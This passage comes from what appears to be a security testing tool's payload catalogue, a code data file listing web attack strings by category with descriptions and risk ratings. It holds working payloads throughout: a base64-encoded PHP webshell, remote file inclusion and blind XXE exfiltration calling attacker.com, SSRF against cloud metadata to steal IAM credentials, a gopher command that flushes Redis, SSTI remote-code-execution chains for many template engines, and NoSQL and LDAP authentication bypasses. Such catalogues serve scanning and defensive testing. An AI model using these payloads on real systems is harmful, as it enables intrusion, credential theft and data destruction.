    payload: "php://input",
    desc: "PHP input wrapper for request body injection (POST data)",
    risk: "high",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-php-data",
    payload: "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    desc: "PHP data wrapper with base64-encoded PHP webshell",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-php-expect",
    payload: "expect://id",
    desc: "PHP expect wrapper for direct command execution",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-php-zip-wrapper",
    payload: "zip://uploads/evil.zip%23shell.php",
    desc: "PHP zip wrapper to extract and include malicious PHP from archive",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-php-phar-wrapper",
    payload: "phar://uploads/evil.phar/shell.php",
    desc: "PHP phar wrapper to execute code from uploaded phar archive",
    risk: "critical",
  },

  // -- Log poisoning --
  {
    cat: "LFI/RFI",
    name: "lfi-log-poisoning-apache",
    payload: "../../../../var/log/apache2/access.log",
    desc: "Include Apache access log after poisoning User-Agent with PHP code",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-log-poisoning-nginx",
    payload: "../../../../var/log/nginx/access.log",
    desc: "Include Nginx access log after poisoning with PHP code",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-log-poisoning-mail",
    payload: "../../../../var/log/mail.log",
    desc: "Include mail log poisoned via SMTP header injection",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-log-poisoning-ssh",
    payload: "../../../../var/log/auth.log",
    desc: "Include SSH auth log poisoned with PHP code in username",
    risk: "critical",
  },

  // -- Filter bypass LFI --
  {
    cat: "LFI/RFI",
    name: "lfi-bypass-double-encode",
    payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    desc: "Path traversal with double URL encoding of dots and slashes",
    risk: "high",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-bypass-utf8-overlong",
    payload: "..%c0%af..%c0%af..%c0%afetc/passwd",
    desc: "Path traversal using UTF-8 overlong encoding of slash",
    risk: "high",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-bypass-dot-truncation",
    payload: "../../../../etc/passwd" + ".".repeat(200),
    desc: "Path traversal with dot truncation to bypass extension check",
    risk: "high",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-bypass-double-slash",
    payload: "....//....//....//etc/passwd",
    desc: "Path traversal with nested sequences to bypass ../ stripping",
    risk: "high",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-bypass-backslash",
    payload: "..\\..\\..\\..\\etc\\passwd",
    desc: "Path traversal using backslashes (may work on some platforms)",
    risk: "high",
  },

  // -- RFI --
  {
    cat: "LFI/RFI",
    name: "rfi-basic-http",
    payload: "http://attacker.com/shell.txt",
    desc: "Remote file inclusion of attacker-hosted PHP shell",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "rfi-null-byte",
    payload: "http://attacker.com/shell.txt%00",
    desc: "RFI with null byte to strip appended extension",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "rfi-https",
    payload: "https://attacker.com/shell.txt",
    desc: "RFI over HTTPS to bypass HTTP-only filters",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "rfi-ftp",
    payload: "ftp://attacker.com/shell.txt",
    desc: "RFI via FTP protocol to bypass HTTP URL filters",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "rfi-data-uri",
    payload: "data://text/plain,<?php system('id');?>",
    desc: "RFI-like inclusion using data URI with inline PHP code",
    risk: "critical",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-windows-iis-log",
    payload: "..\\..\\..\\..\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex210101.log",
    desc: "Windows IIS log file inclusion for log poisoning",
    risk: "high",
  },
  {
    cat: "LFI/RFI",
    name: "lfi-proc-fd",
    payload: "../../../../proc/self/fd/0",
    desc: "Read process file descriptors via proc filesystem",
    risk: "high",
  },

  // =======================================================================
  //  5. SSRF  (22 payloads)
  // =======================================================================

  // -- Internal service probing --
  {
    cat: "SSRF",
    name: "ssrf-localhost",
    payload: "http://127.0.0.1/admin",
    desc: "SSRF to access localhost admin panel behind firewall",
    risk: "high",
  },
  {
    cat: "SSRF",
    name: "ssrf-localhost-alt",
    payload: "http://0.0.0.0/admin",
    desc: "SSRF to access admin using alternative localhost representation",
    risk: "high",
  },
  {
    cat: "SSRF",
    name: "ssrf-internal-192",
    payload: "http://192.168.1.1/",
    desc: "SSRF probing internal RFC1918 network gateway",
    risk: "high",
  },
  {
    cat: "SSRF",
    name: "ssrf-internal-10",
    payload: "http://10.0.0.1/",
    desc: "SSRF probing internal 10.x.x.x network range",
    risk: "high",
  },
  {
    cat: "SSRF",
    name: "ssrf-internal-172",
    payload: "http://172.16.0.1/",
    desc: "SSRF probing internal 172.16.x.x network range",
    risk: "high",
  },
  {
    cat: "SSRF",
    name: "ssrf-redis",
    payload: "http://127.0.0.1:6379/",
    desc: "SSRF targeting internal Redis service on default port",
    risk: "high",
  },
  {
    cat: "SSRF",
    name: "ssrf-elasticsearch",
    payload: "http://127.0.0.1:9200/_cluster/health",
    desc: "SSRF targeting internal Elasticsearch cluster",
    risk: "high",
  },
  {
    cat: "SSRF",
    name: "ssrf-docker-api",
    payload: "http://127.0.0.1:2375/containers/json",
    desc: "SSRF targeting exposed Docker API for container enumeration",
    risk: "critical",
  },
  {
    cat: "SSRF",
    name: "ssrf-kubernetes-api",
    payload: "https://kubernetes.default.svc/api/v1/namespaces",
    desc: "SSRF targeting Kubernetes API service from within cluster",
    risk: "critical",
  },

  // -- Cloud metadata --
  {
    cat: "SSRF",
    name: "ssrf-aws-metadata",
    payload: "http://169.254.169.254/latest/meta-data/",
    desc: "SSRF to access AWS EC2 instance metadata service",
    risk: "critical",
  },
  {
    cat: "SSRF",
    name: "ssrf-aws-iam-creds",
    payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    desc: "SSRF to extract AWS IAM role credentials from metadata",
    risk: "critical",
  },
  {
    cat: "SSRF",
    name: "ssrf-aws-userdata",
    payload: "http://169.254.169.254/latest/user-data/",
    desc: "SSRF to read AWS EC2 user-data (may contain secrets)",
    risk: "critical",
  },
  {
    cat: "SSRF",
    name: "ssrf-gcp-metadata",
    payload: "http://metadata.google.internal/computeMetadata/v1/",
    desc: "SSRF to access GCP instance metadata service",
    risk: "critical",
  },
  {
    cat: "SSRF",
    name: "ssrf-azure-metadata",
    payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    desc: "SSRF to access Azure instance metadata service",
    risk: "critical",
  },
  {
    cat: "SSRF",
    name: "ssrf-digitalocean-metadata",
    payload: "http://169.254.169.254/metadata/v1/",
    desc: "SSRF to access DigitalOcean droplet metadata",
    risk: "critical",
  },

  // -- Protocol smuggling --
  {
    cat: "SSRF",
    name: "ssrf-gopher-redis",
    payload: "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
    desc: "SSRF via gopher protocol to send commands to internal Redis",
    risk: "critical",
  },
  {
    cat: "SSRF",
    name: "ssrf-file-protocol",
    payload: "file:///etc/passwd",
    desc: "SSRF via file protocol to read local filesystem",
    risk: "high",
  },
  {
    cat: "SSRF",
    name: "ssrf-dict-protocol",
    payload: "dict://127.0.0.1:11211/stat",
    desc: "SSRF via dict protocol to query internal memcached",
    risk: "high",
  },

  // -- Filter bypass SSRF --
  {
    cat: "SSRF",
    name: "ssrf-bypass-decimal-ip",
    payload: "http://2130706433/",
    desc: "SSRF bypass using decimal IP representation for 127.0.0.1",
    risk: "high",
  },
  {
    cat: "SSRF",
    name: "ssrf-bypass-hex-ip",
    payload: "http://0x7f000001/",
    desc: "SSRF bypass using hexadecimal IP for 127.0.0.1",
    risk: "high",
  },
  {
    cat: "SSRF",
    name: "ssrf-bypass-ipv6-localhost",
    payload: "http://[::1]/admin",
    desc: "SSRF bypass using IPv6 localhost address",
    risk: "high",
  },
  {
    cat: "SSRF",
    name: "ssrf-bypass-dns-rebinding",
    payload: "http://rebind.attacker.com/",
    desc: "SSRF DNS rebinding attack resolving to internal IP after validation",
    risk: "critical",
  },

  // =======================================================================
  //  6. XXE  (22 payloads)
  // =======================================================================

  // -- File read XXE --
  {
    cat: "XXE",
    name: "xxe-file-read",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>",
    desc: "Classic XXE to read /etc/passwd via external entity",
    risk: "critical",
  },
  {
    cat: "XXE",
    name: "xxe-file-read-windows",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]><data>&xxe;</data>",
    desc: "XXE to read Windows win.ini file",
    risk: "critical",
  },
  {
    cat: "XXE",
    name: "xxe-file-read-base64",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><data>&xxe;</data>",
    desc: "XXE file read using PHP base64 filter to avoid parsing errors",
    risk: "critical",
  },
  {
    cat: "XXE",
    name: "xxe-source-code",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><data>&xxe;</data>",
    desc: "XXE to read application source code via PHP filter",
    risk: "critical",
  },

  // -- SSRF via XXE --
  {
    cat: "XXE",
    name: "xxe-ssrf-aws",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><data>&xxe;</data>",
    desc: "XXE to perform SSRF against AWS metadata service",
    risk: "critical",
  },
  {
    cat: "XXE",
    name: "xxe-ssrf-internal",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/admin\">]><data>&xxe;</data>",
    desc: "XXE to perform SSRF against internal admin panel",
    risk: "critical",
  },
  {
    cat: "XXE",
    name: "xxe-ssrf-port-scan",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:22/\">]><data>&xxe;</data>",
    desc: "XXE-based port scanning of internal services",
    risk: "high",
  },

  // -- Blind XXE --
  {
    cat: "XXE",
    name: "xxe-blind-oob-http",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><data>test</data>",
    desc: "Blind XXE with out-of-band HTTP callback to attacker DTD",
    risk: "critical",
  },
  {
    cat: "XXE",
    name: "xxe-blind-oob-dns",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://xxe.attacker.com/\">]><data>&xxe;</data>",
    desc: "Blind XXE detection via DNS callback to attacker domain",
    risk: "high",
  },
  {
    cat: "XXE",
    name: "xxe-blind-exfil-dtd",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\">%dtd;]><data>test</data>",
    desc: "Blind XXE data exfiltration via external DTD to attacker server",
    risk: "critical",
  },
  {
    cat: "XXE",
    name: "xxe-blind-error-based",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % error \"<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>\">%error;%exfil;]><data>test</data>",
    desc: "Blind XXE using error messages to exfiltrate file contents",
    risk: "critical",
  },

  // -- Parameter entity XXE --
  {
    cat: "XXE",
    name: "xxe-parameter-entity",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % wrapper \"<!ENTITY send SYSTEM 'http://attacker.com/?d=%xxe;'>\">%wrapper;]><data>&send;</data>",
    desc: "XXE using parameter entities for data exfiltration chain",
    risk: "critical",
  },
  {
    cat: "XXE",
    name: "xxe-parameter-entity-dtd-override",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://attacker.com/evil.dtd\" [<!ENTITY % local_dtd SYSTEM \"file:///usr/share/xml/fontconfig/fonts.dtd\">%local_dtd;]><data>test</data>",
    desc: "XXE using local DTD to override entities and bypass restrictions",
    risk: "critical",
  },

  // -- DTD injection --
  {
    cat: "XXE",
    name: "xxe-dtd-injection-cdata",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % start \"<![CDATA[\"><!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://attacker.com/cdata.dtd\">%dtd;]><data>&all;</data>",
    desc: "XXE with CDATA wrapping to exfiltrate files containing XML chars",
    risk: "critical",
  },
  {
    cat: "XXE",
    name: "xxe-svg",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text x=\"0\" y=\"20\">&xxe;</text></svg>",
    desc: "XXE via SVG image upload with embedded entity reference",
    risk: "high",
  },
  {
    cat: "XXE",
    name: "xxe-xlsx",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><si><t>&xxe;</t></si></sst>",
    desc: "XXE via malicious XLSX shared strings XML component",
    risk: "high",
  },
  {
    cat: "XXE",
    name: "xxe-docx",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>",
    desc: "XXE via malicious DOCX document.xml component",
    risk: "high",
  },
  {
    cat: "XXE",
    name: "xxe-soap",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body><test>&xxe;</test></soapenv:Body></soapenv:Envelope>",
    desc: "XXE injection within SOAP XML request body",
    risk: "critical",
  },
  {
    cat: "XXE",
    name: "xxe-xinclude",
    payload: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
    desc: "XXE via XInclude when full document control is not possible",
    risk: "high",
  },
  {
    cat: "XXE",
    name: "xxe-utf16",
    payload: "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>",
    desc: "XXE with UTF-16 encoding to bypass WAF string matching",
    risk: "high",
  },
  {
    cat: "XXE",
    name: "xxe-jar-protocol",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:http://attacker.com/evil.jar!/payload.txt\">]><data>&xxe;</data>",
    desc: "XXE via jar protocol for SSRF with file extraction",
    risk: "high",
  },
  {
    cat: "XXE",
    name: "xxe-netdoc-protocol",
    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"netdoc:///etc/passwd\">]><data>&xxe;</data>",
    desc: "XXE using netdoc protocol as alternative to file protocol",
    risk: "high",
  },

  // =======================================================================
  //  7. SSTI  (22 payloads)
  // =======================================================================

  // -- Jinja2 (Python) --
  {
    cat: "SSTI",
    name: "ssti-jinja2-detect",
    payload: "{{7*7}}",
    desc: "SSTI detection payload for Jinja2/Twig (expects 49)",
    risk: "medium",
  },
  {
    cat: "SSTI",
    name: "ssti-jinja2-config",
    payload: "{{config.items()}}",
    desc: "Jinja2 SSTI to dump Flask application configuration",
    risk: "high",
  },
  {
    cat: "SSTI",
    name: "ssti-jinja2-rce-subprocess",
    payload: "{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}",
    desc: "Jinja2 SSTI RCE via subprocess.Popen class traversal",
    risk: "critical",
  },
  {
    cat: "SSTI",
    name: "ssti-jinja2-rce-os",
    payload: "{{''.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('id').read()}}",
    desc: "Jinja2 SSTI RCE via os.popen through class hierarchy",
    risk: "critical",
  },
  {
    cat: "SSTI",
    name: "ssti-jinja2-rce-import",
    payload: "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{% endfor %}",
    desc: "Jinja2 SSTI RCE via warnings module builtins import chain",
    risk: "critical",
  },
  {
    cat: "SSTI",
    name: "ssti-jinja2-file-read",
    payload: "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
    desc: "Jinja2 SSTI to read files using file subclass",
    risk: "high",
  },
  {
    cat: "SSTI",
    name: "ssti-jinja2-lipsum",
    payload: "{{lipsum.__globals__.os.popen('id').read()}}",
    desc: "Jinja2 SSTI RCE via lipsum global function os module access",
    risk: "critical",
  },

  // -- Twig (PHP) --
  {
    cat: "SSTI",
    name: "ssti-twig-detect",
    payload: "{{7*'7'}}",
    desc: "SSTI detection differentiating Twig (returns 49) from Jinja2 (returns 7777777)",
    risk: "medium",
  },
  {
    cat: "SSTI",
    name: "ssti-twig-rce",
    payload: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
    desc: "Twig SSTI RCE via registerUndefinedFilterCallback with exec",
    risk: "critical",
  },
  {
    cat: "SSTI",
    name: "ssti-twig-file-read",
    payload: "{{'/etc/passwd'|file_excerpt(1,30)}}",
    desc: "Twig SSTI to read file contents via file_excerpt filter",
    risk: "high",
  },
  {
    cat: "SSTI",
    name: "ssti-twig-system",
    payload: "{{['id']|filter('system')}}",
    desc: "Twig SSTI RCE using filter function with system callback",
    risk: "critical",
  },

  // -- Freemarker (Java) --
  {
    cat: "SSTI",
    name: "ssti-freemarker-rce",
    payload: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    desc: "Freemarker SSTI RCE via Execute utility class instantiation",
    risk: "critical",
  },
  {
    cat: "SSTI",
    name: "ssti-freemarker-file-read",
    payload: "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(\" \")}",
    desc: "Freemarker SSTI file read via reflection chain",
    risk: "critical",
  },

  // -- Velocity (Java) --
  {
    cat: "SSTI",
    name: "ssti-velocity-rce",
    payload: "#set($cmd='id')#set($rt=$x.class.forName('java.lang.Runtime'))#set($getrt=$rt.getMethod('getRuntime'))#set($runtime=$getrt.invoke(null))#set($proc=$runtime.exec($cmd))$proc.waitFor()#set($is=$proc.getInputStream())#foreach($i in [1..$is.available()])$chr.toChars($is.read())#end",
    desc: "Velocity SSTI RCE via Java Runtime reflection chain",
    risk: "critical",
  },

  // -- Mako (Python) --
  {
    cat: "SSTI",
    name: "ssti-mako-rce",
    payload: "${__import__('os').popen('id').read()}",
    desc: "Mako SSTI direct RCE via Python import and os.popen",
    risk: "critical",
  },
  {
    cat: "SSTI",
    name: "ssti-mako-rce-subprocess",
    payload: "<%import subprocess%>${subprocess.check_output('id',shell=True)}",
    desc: "Mako SSTI RCE using subprocess module import",
    risk: "critical",
  },

  // -- Thymeleaf (Java) --
  {
    cat: "SSTI",
    name: "ssti-thymeleaf-rce",
    payload: "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
    desc: "Thymeleaf SSTI RCE via SpEL expression in preprocessing",
    risk: "critical",
  },
  {
    cat: "SSTI",
    name: "ssti-thymeleaf-spel",
    payload: "${T(java.lang.Runtime).getRuntime().exec('id')}",
    desc: "Thymeleaf SSTI via Spring Expression Language (SpEL) injection",
    risk: "critical",
  },

  // -- Pebble (Java) --
  {
    cat: "SSTI",
    name: "ssti-pebble-rce",
    payload: "{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes])&empty) }}",
    desc: "Pebble SSTI RCE via Java Runtime reflection and byte stream",
    risk: "critical",
  },

  // -- Smarty (PHP) --
  {
    cat: "SSTI",
    name: "ssti-smarty-rce",
    payload: "{system('id')}",
    desc: "Smarty SSTI direct command execution via system function",
    risk: "critical",
  },
  {
    cat: "SSTI",
    name: "ssti-smarty-rce-php",
    payload: "{php}echo shell_exec('id');{/php}",
    desc: "Smarty SSTI RCE via embedded PHP code block",
    risk: "critical",
  },

  // -- ERB (Ruby) --
  {
    cat: "SSTI",
    name: "ssti-erb-rce",
    payload: "<%= system('id') %>",
    desc: "ERB SSTI RCE via Ruby system command execution",
    risk: "critical",
  },
  {
    cat: "SSTI",
    name: "ssti-erb-file-read",
    payload: "<%= File.read('/etc/passwd') %>",
    desc: "ERB SSTI to read files using Ruby File.read",
    risk: "high",
  },

  // =======================================================================
  //  8. NoSQL Injection  (17 payloads)
  // =======================================================================

  // -- MongoDB injection --
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-auth-bypass",
    payload: "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
    desc: "MongoDB authentication bypass using $gt operator",
    risk: "critical",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-ne-bypass",
    payload: "{\"username\":{\"$ne\":\"\"},\"password\":{\"$ne\":\"\"}}",
    desc: "MongoDB auth bypass with $ne (not equal empty string)",
    risk: "critical",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-regex-bypass",
    payload: "{\"username\":{\"$regex\":\"admin\"},\"password\":{\"$ne\":\"\"}}",
    desc: "MongoDB auth bypass targeting admin user with regex match",
    risk: "critical",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-regex-extract",
    payload: "{\"username\":\"admin\",\"password\":{\"$regex\":\"^a\"}}",
    desc: "MongoDB password extraction via regex character brute-force",
    risk: "critical",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-where",
    payload: "{\"$where\":\"this.username=='admin'\"}",
    desc: "MongoDB injection via $where JavaScript expression",
    risk: "critical",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-where-sleep",
    payload: "{\"$where\":\"sleep(5000)\"}",
    desc: "MongoDB time-based injection using $where with sleep",
    risk: "high",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-in-operator",
    payload: "{\"username\":{\"$in\":[\"admin\",\"root\",\"administrator\"]}}",
    desc: "MongoDB user enumeration using $in operator with common names",
    risk: "high",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-exists",
    payload: "{\"username\":{\"$exists\":true},\"password\":{\"$exists\":true}}",
    desc: "MongoDB query to find all documents with username and password fields",
    risk: "high",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-type-array",
    payload: "username[$ne]=admin&password[$ne]=pass",
    desc: "MongoDB injection via HTTP parameter array syntax",
    risk: "critical",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-js-function",
    payload: "{\"$where\":\"function(){return this.username=='admin'&&this.password.match(/^p/)}\"}",
    desc: "MongoDB data extraction via $where with JavaScript function",
    risk: "critical",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-mapreduce",
    payload: "{\"$func\":\"function(){emit(1,this.password)}\"}",
    desc: "MongoDB data leak via MapReduce injection",
    risk: "critical",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-aggregate",
    payload: "[{\"$match\":{}},{\"$out\":\"stolen_data\"}]",
    desc: "MongoDB injection in aggregation pipeline to copy collection",
    risk: "critical",
  },

  // -- CouchDB injection --
  {
    cat: "NoSQL Injection",
    name: "nosql-couch-all-docs",
    payload: "/_all_docs?include_docs=true",
    desc: "CouchDB injection to dump all documents with full content",
    risk: "critical",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-couch-view-injection",
    payload: "/_design/users/_view/all",
    desc: "CouchDB view access to enumerate stored documents",
    risk: "high",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-couch-auth-bypass",
    payload: "{\"selector\":{\"username\":{\"$eq\":\"admin\"}},\"fields\":[\"username\",\"password\"]}",
    desc: "CouchDB Mango query to extract admin credentials",
    risk: "critical",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-or-bypass",
    payload: "{\"$or\":[{\"username\":\"admin\"},{\"username\":\"root\"}],\"password\":{\"$gt\":\"\"}}",
    desc: "MongoDB auth bypass using $or to target multiple admin accounts",
    risk: "critical",
  },
  {
    cat: "NoSQL Injection",
    name: "nosql-mongo-size",
    payload: "{\"password\":{\"$size\":8}}",
    desc: "MongoDB query to find users with a specific password length",
    risk: "medium",
  },

  // =======================================================================
  //  9. LDAP Injection  (12 payloads)
  // =======================================================================

  {
    cat: "LDAP Injection",
    name: "ldap-auth-bypass-wildcard",
    payload: "*",
    desc: "LDAP authentication bypass using wildcard matching",
    risk: "critical",
  },
  {
    cat: "LDAP Injection",
    name: "ldap-auth-bypass-true",
    payload: "*)(&",
    desc: "LDAP filter injection to create always-true condition",
    risk: "critical",
  },
  {
    cat: "LDAP Injection",
    name: "ldap-auth-bypass-or",
    payload: "admin)(|(password=*)",
    desc: "LDAP OR filter injection to bypass password verification",
    risk: "critical",
  },
  {
    cat: "LDAP Injection",
    name: "ldap-extract-password-prefix",
    payload: "admin)(password=a*)",
    desc: "LDAP password brute-force by prefix matching",
    risk: "critical",
  },
  {
    cat: "LDAP Injection",
    name: "ldap-enum-users",
    payload: "*)(&(objectClass=user)",
    desc: "LDAP injection to enumerate all user objects",
    risk: "high",
  },
  {
    cat: "LDAP Injection",
    name: "ldap-enum-groups",
    payload: "*)(&(objectClass=group)",
    desc: "LDAP injection to enumerate all group objects",
    risk: "high",
  },
  {
    cat: "LDAP Injection",
    name: "ldap-admin-group",
    payload: "*)(&(memberOf=CN=Admins,DC=target,DC=com)",
    desc: "LDAP injection to find members of the Admins group",
    risk: "high",
  },
  {
    cat: "LDAP Injection",
    name: "ldap-email-exfil",
    payload: "*)(mail=*@target.com)",
    desc: "LDAP injection to extract email addresses from directory",
    risk: "medium",
  },
  {
    cat: "LDAP Injection",
    name: "ldap-null-base-dn",
    payload: "*)(&(objectClass=*)(|(cn=*)",
    desc: "LDAP injection with null base DN for directory-wide search",
    risk: "high",
  },
  {
    cat: "LDAP Injection",
    name: "ldap-description-extract",
    payload: "*)(description=*",
    desc: "LDAP injection to extract description fields (may contain secrets)",
    risk: "medium",
  },
  {
    cat: "LDAP Injection",
    name: "ldap-blind-boolean",
    payload: "admin)(|(cn=admin)(cn=notexist)",
    desc: "LDAP blind boolean injection for attribute enumeration",
    risk: "high",
  },
  {
    cat: "LDAP Injection",
    name: "ldap-wildcard-attribute",
    payload: "*)(userPassword=*",
    desc: "LDAP wildcard injection to verify userPassword attribute exists",
    risk: "high",
  },

  // =======================================================================
  //  10. Header Injection  (17 payloads)
  // =======================================================================

  // -- Host header attacks --
  {
    cat: "Header Injection",
    name: "header-host-override",
    payload: "Host: evil.com",
    desc: "Host header injection to manipulate server-side host resolution",
    risk: "medium",
  },
  {
    cat: "Header Injection",
    name: "header-host-password-reset",
    payload: "Host: evil.com",
    desc: "Host header poisoning in password reset to redirect token to attacker",
    risk: "high",
  },
  {
    cat: "Header Injection",
    name: "header-host-double",
    payload: "Host: target.com\r\nHost: evil.com",
    desc: "Double Host header injection for cache poisoning or routing confusion",
    risk: "high",
  },
  {
    cat: "Header Injection",
    name: "header-x-forwarded-host",
    payload: "X-Forwarded-Host: evil.com",
    desc: "X-Forwarded-Host injection to override server host resolution",
    risk: "medium",
  },

  // -- X-Forwarded-For --
  {
    cat: "Header Injection",
    name: "header-xff-bypass",
    payload: "X-Forwarded-For: 127.0.0.1",
    desc: "X-Forwarded-For spoofing to bypass IP-based access controls",
    risk: "high",
  },
  {
    cat: "Header Injection",
    name: "header-xff-chain",
    payload: "X-Forwarded-For: 127.0.0.1, 10.0.0.1, 192.168.1.1",
    desc: "X-Forwarded-For chain injection to confuse IP parsing logic",
    risk: "medium",
  },
  {
    cat: "Header Injection",
    name: "header-real-ip",
    payload: "X-Real-IP: 127.0.0.1",
    desc: "X-Real-IP header spoofing for IP-based access control bypass",
    risk: "high",
  },
  {
    cat: "Header Injection",
    name: "header-client-ip",
    payload: "Client-IP: 127.0.0.1",
    desc: "Client-IP header spoofing as alternative IP override",
    risk: "medium",
  },

  // -- CRLF injection --
  {
    cat: "Header Injection",
    name: "crlf-header-injection",
    payload: "%0d%0aInjected-Header: evil-value",
    desc: "CRLF injection to add arbitrary response header",
    risk: "medium",
  },
  {
    cat: "Header Injection",
    name: "crlf-xss",
    payload: "%0d%0a%0d%0a<script>alert('XSS')</script>",
    desc: "CRLF injection to inject XSS payload in HTTP response body",
    risk: "high",
  },
  {
    cat: "Header Injection",
    name: "crlf-set-cookie",
    payload: "%0d%0aSet-Cookie: session=evil; domain=target.com; path=/",
    desc: "CRLF injection to set arbitrary cookies on victim browser",
    risk: "high",
  },
  {
    cat: "Header Injection",
    name: "crlf-location-redirect",
    payload: "%0d%0aLocation: http://evil.com/phish",
    desc: "CRLF injection to redirect user via Location header",
    risk: "high",
  },
  {
    cat: "Header Injection",
    name: "crlf-response-splitting",
